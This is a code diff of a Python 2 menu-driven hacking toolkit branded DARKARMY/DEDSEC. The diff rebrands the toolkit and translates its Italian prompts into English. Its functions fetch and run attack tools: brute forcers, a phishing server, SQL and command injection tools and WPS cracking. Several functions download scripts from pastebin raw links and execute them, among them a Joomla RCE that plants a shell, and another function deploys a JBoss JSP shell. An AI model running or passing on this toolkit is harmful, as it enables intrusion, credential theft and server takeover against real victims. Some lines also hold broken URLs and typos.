@@ -2,13 +2,15 @@
 #
 #  
 #  
-#       ______  ___  ______ _   __  ___  _________  ____   __
-#       |  _  \/ _ \ | ___ \ | / / / _ \ | ___ \  \/  \ \ / /
-#       | | | / /_\ \| |_/ / |/ / / /_\ \| |_/ / .  . |\ V / 
-#       | | | |  _  ||    /|    \ |  _  ||    /| |\/| | \ /  
-#       | |/ /| | | || |\ \| |\  \| | | || |\ \| |  | | | |  
-#       |___/ \_| |_/\_| \_\_| \_/\_| |_/\_| \_\_|  |_/ \_/  
-#                                       ~@~ coded by 1ucif3r ~@~
+
+#  ______  _____ ______  _____  _____  _____ 
+#  |  _  \|  ___||  _  \/  ___||  ___|/  __ \
+#  | | | || |__  | | | |\ `--. | |__  | /  \/
+#  | | | ||  __| | | | | `--. \|  __| | |    
+#  | |/ / | |___ | |/ / /\__/ /| |___ | \__/\
+#  |___/  \____/ |___/  \____/ \____/  \____/
+#                                        
+#                                       ~@~ coded by Kryp3ton ~@~
 
 import sys
 import argparse
@@ -43,28 +45,22 @@ os.system('clear')
 
 def menu():
     print ("""
-Licenza MIT
-
-Copyright (c) 2021 DEDSEC
-
-L'autorizzazione è concessa, a titolo gratuito, a chiunque ne ottenga una copia
-di questo software e dei file di documentazione associati (il "Software"), per trattare
-nel Software senza restrizioni, inclusi senza limitazione i diritti
-utilizzare, copiare, modificare, unire, pubblicare, distribuire, concedere in sublicenza e/o vendere
-copie del Software,
-e per consentire alle persone a cui il Software è
-arredato a tal fine, alle seguenti condizioni:
-
-L'avviso di copyright di cui sopra e questo avviso di autorizzazione devono essere inclusi in tutto
-copie o parti sostanziali del Software.
-
-IL SOFTWARE VIENE FORNITO "COS COM'È", SENZA GARANZIE DI ALCUN TIPO, ESPRESSE O
-IMPLICITA,
-COMPRESE MA NON LIMITATE ALLE GARANZIE DI COMMERCIABILITÀ,
-IDONEITÀ PER UNO SCOPO PARTICOLARE E NON VIOLAZIONE. IN NESSUN CASO IL
-GLI AUTORI O I TITOLARI DEL COPYRIGHT SARANNO RESPONSABILI PER QUALSIASI RECLAMO, DANNI O ALTRO
-RESPONSABILITÀ, SIA IN AZIONE CONTRATTUALE, ILLECITO O ALTRO, DERIVANTE DA,
-FUORI O IN CONNESSIONE CON IL SOFTWARE O L'USO O ALTRI TRATTAMENTI IN
+MIT License
+Copyright (c) 2021 DARKARMY
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.""")
 
 
@@ -84,26 +80,20 @@ no = set(['no', 'n'])
 
 
 
-
-
-
 darkarmylogo = """\033[0m
-
-
- ______  _____ ______  _____  _____  _____ 
+ 
+______  _____ ______  _____  _____  _____ 
 |  _  \|  ___||  _  \/  ___||  ___|/  __ \
 | | | || |__  | | | |\ `--. | |__  | /  \/
 | | | ||  __| | | | | `--. \|  __| | |    
 | |/ / | |___ | |/ / /\__/ /| |___ | \__/\
 |___/  \____/ |___/  \____/ \____/  \____/
                                           
-                                          
-                                          
-                                                                                                              
+
  \033[91m"""
 def menu():
     print (darkarmylogo + """\033[1m
-   [!] Coded By Kryp3ton [!] https://dedsec.tk [!]
+   [!] Coded By Kryp3ton [!]
 \033[0m
    {1}--Information Gathering
    {2}--Password Attacks
@@ -114,10 +104,10 @@ def menu():
    {7}--Web Hacking
    {8}--Private Web Hacking
    {9}--Post Exploitation
-   {0}--Update DEDSEC 
+   {0}--Update The DARKARMY 
    {99}-Exit
  """)
-    choice = raw_input("DEDSEC~# ")
+    choice = raw_input("DARKARMY~# ")
     os.system('clear')
     if choice == "1":
         info()
@@ -146,17 +136,17 @@ def menu():
 
 
 def updatedarkarmy():
-    print ("Questo strumento è disponibile solo per Linux e sistemi simili.")
-    choiceupdate = raw_input("Continuare Y / N: ")
+    print ("This Tool is Only Available for Linux and Similar Systems. ")
+    choiceupdate = raw_input("Continue Y / N: ")
     if choiceupdate in yes:
-        os.system("git clone https://github.com/Kryp3ton/Dedsec.git")
-        os.system("cd DEDSEC && sudo bash ./update.sh")
-        os.system("dedsec")
+        os.system("git clone hhttps://github.com/Kryp3ton/Dedsec.git")
+        os.system("cd DARKARMY && sudo bash ./update.sh")
+        os.system("darkarmy")
 
 
 def doork():
-    print("doork è uno strumento open source per la verifica della vulnerabilità passiva che automatizza il processo di ricerca su Google di informazioni su un sito Web specifico basato su dorks.")
-    doorkchice = raw_input("Continuare Y / N: ")
+    print("doork is a open-source passive vulnerability auditor tool that automates the process of searching on Google information about specific website based on dorks. ")
+    doorkchice = raw_input("Continue Y / N: ")
     if doorkchice in yes:
         os.system("pip install beautifulsoup4 && pip install requests")
         os.system("git clone https://github.com/AeonDave/doork")
@@ -185,7 +175,7 @@ def postexp():
 
 
 def scanusers():
-    site = raw_input('Inserisci un sitoweb : ')
+    site = raw_input('Enter a website : ')
     try:
         users = site
         if 'http://www.' in users:
@@ -203,8 +193,8 @@ def scanusers():
             resp = urllib2.urlopen(
                 site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()
 
-            if 'username invalido' not in resp.lower():
-                print "\tTrovato -> %s" % users
+            if 'invalid username' not in resp.lower():
+                print "\tFound -> %s" % users
                 pass
 
             users = users[:-1]
@@ -214,19 +204,19 @@ def scanusers():
 
 def brutex():
     clearScr()
-    print("esegue il bruteforce automaticamente tutti i servizi in esecuzione su un target: porte aperte / domini DNS / nomi utente / password")
+    print("Automatically brute force all services running on a target : Open ports / DNS domains / Usernames / Passwords ")
     os.system("git clone https://github.com/1N3/BruteX.git")
     clearScr()
-    brutexchoice = raw_input("Seleziona un target : ")
+    brutexchoice = raw_input("Select a Target : ")
     os.system("cd BruteX && chmod 777 brutex && ./brutex %s" % brutexchoice)
 
 
 def arachni():
-    print("Arachni è un framework Ruby completo, modulare e ad alte prestazioni volto ad aiutare i penetration tester e gli amministratori a valutare la sicurezza delle applicazioni web")
-    cara = raw_input("installare Arachni ed eseguirlo ? Y / N : ")
+    print("Arachni is a feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications")
+    cara = raw_input("Install And Run ? Y / N : ")
     clearScr()
     print("exemple : http://www.target.com/")
-    tara = raw_input("Seleziona un target da scansionare : ")
+    tara = raw_input("Select a target to scan : ")
     if cara in yes:        
         os.system("git clone git://github.com/Arachni/arachni.git")
         os.system(
@@ -238,7 +228,7 @@ def arachni():
 
 def XSStrike():
     clearScr()
-    print("XSStrike è uno script Python progettato per rilevare e sfruttare le vulnerabilità XSS. Segui il proprietario su Github @UltimateHackers")
+    print("XSStrike is a python script designed to detect and exploit XSS vulnerabilites. Follow The Owner On Github @UltimateHackers")
     os.system("sudo rm -rf XSStrike")
     os.system("git clone https://github.com/UltimateHackers/XSStrike.git && cd XSStrike && pip install -r requirements.txt && clear && python xsstrike")
 
@@ -252,8 +242,8 @@ def crips():
 
 
 def weeman():
-    print("Server HTTP per il phishing in python. (e framework) Di solito vorrai eseguire Weeman con un attacco di spoofing DNS. (vedi dsniff, ettercap).")
-    choicewee = raw_input("installare Weeman ? Y / N : ")
+    print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
+    choicewee = raw_input("Install Weeman ? Y / N : ")
     if choicewee in yes:
         os.system(
             "git clone https://github.com/samyoyo/weeman.git && cd weeman && python weeman.py")
@@ -264,11 +254,11 @@ def weeman():
 
 
 def gabriel():
-    print("Abuso di bypass di autenticazione di Open&Compact (Gabriel's)")
+    print("Abusing authentication bypass of Open&Compact (Gabriel's)")
     os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
     clearScr()
     os.system("python gabriel.py")
-    ftpbypass = raw_input("Inserire l'ip del traget e il comando :")
+    ftpbypass = raw_input("Enter Target IP and Use Command :")
     os.system("python gabriel.py %s" % ftpbypass)
 
 
@@ -279,21 +269,21 @@ def sitechecker():
 
 
 def h2ip():
-    host = raw_input("Selezionare un Host : ")
+    host = raw_input("Select A Host : ")
     ips = socket.gethostbyname(host)
     print(ips)
 
 
 def ports():
     clearScr()
-    target = raw_input('IP del target : ')
+    target = raw_input('Select a Target IP : ')
     os.system("nmap -O -Pn %s" % target)
     sys.exit()
 
 
 def ifinurl():
-    print("Questa ricerca avanzata nei motori di ricerca, consente l'analisi fornita per sfruttare GET/POST catturando email e URL, con un nodo di convalida personalizzato interno per ogni target/url trovato.")
-    print('Vuoi installare inurlBR ?')
+    print""" This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found."""
+    print('Do You Want To Install InurlBR ? ')
     cinurl = raw_input("Y/N: ")
     if cinurl in yes:
         inurl()
@@ -307,15 +297,15 @@ def ifinurl():
 
 def bsqlbf():
     clearScr()
-    print("Questo strumento funzionerà solo su blind sql injection")
-    cbsq = raw_input("seleziona un target : ")
+    print("This tool will only work on blind sql injection")
+    cbsq = raw_input("select target : ")
     os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
     os.system("perl bsqlbf.pl -url %s" % cbsq)
     os.system("rm bsqlbf.pl")
 
 
 def atscan():
-    print ("Vuoi installare ATSCAN ?")
+    print ("Do You To Install ATSCAN ?")
     choiceshell = raw_input("Y/N: ")
     if choiceshell in yes:
         os.system("sudo rm -rf ATSCAN")
@@ -327,9 +317,9 @@ def atscan():
 
 
 def commix():
-    print ("Strumento di iniezione e sfruttamento dei comandi del sistema operativo all-in-one automatizzato.")
+    print ("Automated All-in-One OS Command Injection and Exploitation Tool.")
     print ("usage : python commix.py --help")
-    choicecmx = raw_input("Continuare: y/n :")
+    choicecmx = raw_input("Continue: y/n :")
     if choicecmx in yes:
         os.system("git clone https://github.com/stasinopoulos/commix.git commix")
         os.system("cd commix")
@@ -341,8 +331,9 @@ def commix():
 
 
 def pixiewps():
-    print("Pixiewps è uno strumento scritto in C utilizzato per forzare offline il pin WPS sfruttando l'entropia bassa o inesistente di alcuni Access Point, il cosiddetto attacco pixie dust scoperto da Dominique Bongard nell'estate 2014. Ha solo scopo didattico")
-    choicewps = raw_input("Continuare ? Y/N : ")
+    print"""Pixiewps is a tool written in C used to bruteforce offline the WPS pin exploiting the low or non-existing entropy of some Access Points, the so-called "pixie dust attack" discovered by Dominique Bongard in summer 2014. It is meant for educational purposes only
+    """
+    choicewps = raw_input("Continue ? Y/N : ")
     if choicewps in yes:
         os.system("git clone https://github.com/wiire/pixiewps.git")
         os.system("cd pixiewps & make ")
@@ -424,14 +415,14 @@ def vbulletinrce():
 def joomlarce():
     os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
     clearScr()
-    print("se la risposta è 200 , troverai la tua shell in Joomla_3.5_Shell.txt")
-    jmtarget = raw_input("Sscegli il tuo target :")
+    print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
+    jmtarget = raw_input("Select a targets list :")
     os.system("python temp.py %s" % jmtarget)
 
 
 def inurl():
-    dork = raw_input("seleziona una Dork:")
-    output = raw_input("seleziona un file da salvare :")
+    dork = raw_input("select a Dork:")
+    output = raw_input("select a file to save :")
     os.system(
         "./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
     if cinurl in no:
@@ -453,7 +444,7 @@ def insinurl():
 
 def nmap():
 
-    choice7 = raw_input("continuare ? Y / N : ")
+    choice7 = raw_input("continue ? Y / N : ")
     if choice7 in yes:
         os.system("git clone https://github.com/nmap/nmap.git")
         os.system("cd nmap && ./configure && make && make install")
@@ -467,12 +458,12 @@ def nmap():
 
 def jboss():
     os.system('clear')
-    print ("Questo script JBoss distribuisce una shell JSP sul server JBoss AS di destinazione. Una volta")
-    print ("distribuito, lo script utilizza la sua capacità di caricamento ed esecuzione dei comandi per")
-    print ("fornire una sessione interattiva.")
+    print ("This JBoss script deploys a JSP shell on the target JBoss AS server. Once")
+    print ("deployed, the script uses its upload and command execution capability to")
+    print ("provide an interactive session.")
     print ("")
     print ("usage : ./e.sh target_ip tcp_port ")
-    print("Continuare: y/n")
+    print("Continue: y/n")
     choice9 = raw_input("yes / no :")
     if choice9 in yes:
         os.system(
@@ -488,8 +479,8 @@ def jboss():
 
 def wppluginscan():
     Notfound = [404, 401, 400, 403, 406, 301]
-    sitesfile = raw_input("file del sito : ")
-    filepath = raw_input("File dei Plugin : ")
+    sitesfile = raw_input("sites file : ")
+    filepath = raw_input("Plugins File : ")
 
     def scan(site, dir):
         global resp
@@ -498,7 +489,7 @@ def wppluginscan():
             conn.request('HEAD', "/wp-content/plugins/" + dir)
             resp = conn.getresponse().status
         except(), message:
-            print ("Connessione non riuscita:"+ message)
+            print "Cant Connect :", message
             pass
 
     def timer():
@@ -514,15 +505,15 @@ def wppluginscan():
             plugin = plugin.rstrip()
             scan(site, plugin)
             if resp not in Notfound:
-                print ("+----------------------------------------+")
-                print ("| current site :") + site
-                print ("| Found Plugin : ") + plugin
-                print ("| Result:") + resp
+                print "+----------------------------------------+"
+                print "| current site :" + site
+                print "| Found Plugin : " + plugin
+                print "| Result:", resp
 
 
 def sqlmap():
-    print ("usare : python sqlmap.py -h")
-    choice8 = raw_input("Continuare: y/n :")
+    print ("usage : python sqlmap.py -h")
+    choice8 = raw_input("Continue: y/n :")
     if choice8 in yes:
         os.system(
             "git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
@@ -540,9 +531,9 @@ def grabuploadedlink(url):
         for dir in directories:
             currentcode = urllib.urlopen(url + dir).getcode()
             if currentcode == 200 or currentcode == 403:
-                print ("-------------------------")
-                print ("  [ + ] Found Directory :  " ) + str(url + dir) + (" [ + ]")
-                print ("-------------------------")
+                print "-------------------------"
+                print "  [ + ] Found Directory :  " + str(url + dir) + " [ + ]"
+                print "-------------------------"
                 upload.append(url + dir)
     except:
         pass
@@ -554,15 +545,15 @@ def grabshell(url):
             for shell in shells:
                 currentcode = urllib.urlopen(upl + shell).getcode()
                 if currentcode == 200:
-                    print ("-------------------------")
-                    print ("  [ ! ] Found Shell :  ") + str(upl + shell) + (" [ ! ]")
-                    print ("-------------------------")
+                    print "-------------------------"
+                    print "  [ ! ] Found Shell :  " + str(upl + shell) + " [ ! ]"
+                    print "-------------------------"
     except:
         pass
 
 
 def shelltarget():
-    print("esempio : http://target.com")
+    print("exemple : http://target.com")
     line = raw_input("target : ")
     line = line.rstrip()
     grabuploadedlink(line)
@@ -570,7 +561,7 @@ def shelltarget():
 
 
 def poet():
-    print("POET e un semplice post-explotation tool")
+    print("POET is a simple POst-Exploitation Tool.")
     print("")
     choicepoet = raw_input("y / n :")
     if choicepoet in yes:
@@ -586,10 +577,10 @@ def poet():
 
 
 def setoolkit():
-    print ("Il Social-Engineer Toolkit è un framework di test di penetrazione open source")
-    print(" progettato per l'ingegneria sociale. SET ha un numero di vettori di attacco personalizzati che")
-    print(" consentono di effettuare rapidamente un attacco credibile. SET è un prodotto di TrustedSec, LLC  ")
-    print("una società di consulenza sulla sicurezza delle informazioni con sede a Cleveland, Ohio.")
+    print ("The Social-Engineer Toolkit is an open-source penetration testing framework")
+    print(") designed for social engineering. SET has a number of custom attack vectors that ")
+    print(" allow you to make a believable attack quickly. SET is a product of TrustedSec, LLC  ")
+    print("an information security consulting firm located in Cleveland, Ohio.")
     print("")
 
     choiceset = raw_input("y / n :")
@@ -999,7 +990,6 @@ def pisher():
 
 
 menuu = darkarmylogo + """
-
    {1}--Get all websites
    {2}--Get joomla websites
    {3}--Get wordpress websites
@@ -1012,7 +1002,6 @@ menuu = darkarmylogo + """
    {10}-ports Scan (common ports)
    {11}-Get server Info
    {12}-Bypass Cloudflare
-
    {99}-Back To Main Menu
 """
 
